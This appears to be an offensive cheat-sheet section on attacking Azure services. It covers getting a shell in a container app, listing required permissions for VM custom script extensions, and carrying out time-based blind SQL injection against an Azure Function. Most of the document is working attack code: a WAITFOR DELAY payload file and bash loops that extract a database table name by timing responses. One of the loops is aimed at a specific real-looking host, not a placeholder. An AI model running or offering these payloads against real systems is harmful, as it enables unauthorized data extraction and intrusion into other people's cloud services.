## Azure Containers
Getting command execution
```
az containerapp exec --name CONTAINER_APP --resource-group RESOURCE_GROUP
# env
```

## Azure Funtions
Payload file
```
#pwn.json
{"email": "test"}
{"email": "' WAITFOR DELAY '0:0:05';--"} 
```
Test for SQL Injection
```
curl https://FUNCTION_APPNAME.azurewebsites.net/api/HttpTrigger1 -d @pwn.json
time curl https://FUNCTION_APPNAME.azurewebsites.net/api/HttpTrigger1 -d @pwn.json
```

Check length
```
#!/bin/bash

for ((i = 1; i <= 100; i++)); do

    SECONDS=0;

    curl -X POST https://FUNCTION_APPNAME.azurewebsites.net/api/HttpTrigger1 --data @<(cat <<EOF
{"email": "' IF (SELECT LEN((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U')))=$i WAITFOR DELAY '0:0:05'--"}
EOF
)

    if [ $(echo $SECONDS) -gt 4 ]; then
        echo "Found table name length: $i"
        break
    fi

    echo "Character length $i checked."
done
```

Look for table name
```
#!/bin/bash

echo "Retrieving table name..."

found_chars=""
found_count=0

for ((i = 1; i <= 7 && found_count < 7; i++)); do
    for ((j = 97; j <= 122 && found_count < 7; j++)); do
        SECONDS=0;
        printf "Checking: $(printf \\x$(printf %x $j))\r" # Show the current ASCII character being checked
        curl -s -X POST https://mbt-subscriptions.azurewebsites.net/api/HttpTrigger1 --data @<(cat <<EOF
{"email": "'IF ASCII(LOWER(SUBSTRING((SELECT TOP 1 NAME FROM sysobjects WHERE xtype='U'),$i,1)))=$j WAITFOR DELAY '00:00:05'--"}
EOF
) > /dev/null
        if [ $(echo $SECONDS) -gt 4 ]; then
            found_chars+="$(printf \\x$(printf %x $j))" # Accumulate the found characters
            printf "Found: $(printf \\x$(printf %x $j))\n" # Show the hit found
            ((found_count++)) # Increment the found count
        fi
    done
done

echo "Table Name: $found_chars"
```

## Azure VM Exploitation

### Custom Script Extensions

Create custom script extensions
```
# Required permission
Microsoft.Compute/virtualMachines/extensions/write

Az PowerShell command:  Set-AzVMExtension

```


Read existing script extension
```
# Permission to read existing custom script extension:
 Microsoft.Compute/virtualMachines/extensions/read

Az PowerShell command: Get-AzVMExtension
```
